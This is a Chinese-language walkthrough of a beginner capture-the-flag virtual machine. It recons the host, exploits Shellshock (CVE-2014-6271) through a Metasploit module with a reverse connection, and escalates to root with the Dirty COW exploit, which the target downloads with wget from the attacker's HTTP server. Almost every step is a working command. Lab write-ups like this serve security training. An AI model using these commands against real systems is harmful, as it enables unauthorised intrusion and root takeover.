虚拟机简介：获取root下的flag

目标：1个flag

级别：初级

1、通过netdiscover检测主机IP地址

netdiscover -r 192.168.207.0/24

2、通过nmap进行端口扫描

nmap -A -sS -sV -v -p- 192.168.207.174
查看只开放22和80端口

3、WEB渗透测试

3.1 使用dirb进行扫描没有发现有用信息，使用nikto探测可能存在CVE-2014-6271和CVE-2014-6278漏洞

nikto -host http://192.168.207.174

3.2 使用metasploit搜索CVE-2014-6271

search CVE-2014-6271

3.3 加载漏洞利用模块

该模块通过将HTTP_USER_AGENT环境变量设置为恶意函数定义来定位Apache Web服务器中的CGI脚本

use exploit/multi/http/apache_mod_cgi_bash_env_execset rhosts 192.168.207.174set lhost 192.168.207.129set targeturi /cgi-bin/testexploit

3.4 使用sysinfo命令来发现计算机的操作系统是Ubuntu 12.04

sysinfo

3.5 较旧的操作系统具有易受攻击的内核，使用脏牛进行漏洞提权

searchsploit kernel 3.2


4、系统提权

4.1 复制提权文件并开启http服务

cp /usr/share/exploitdb/exploits/linux/local/40839.c ./python -m SimpleHTTPServer 80

4.2 靶机进入shell模式，并下载提权文件

shellpython -c 'import pty; pty.spawn("/bin/sh")'cd /tmpwget http://192.168.207.129/40839.cgcc -pthread 40839.c -o dirty -lcrypt

4.3 根据提权脚本使用方法

# 设置密码为123456./dirty 12345

4.4 使用ssh连接靶机，用户为firefart，密码为12345，查看flag

ssh firefart@192.168.207.174cat /root/root.txt
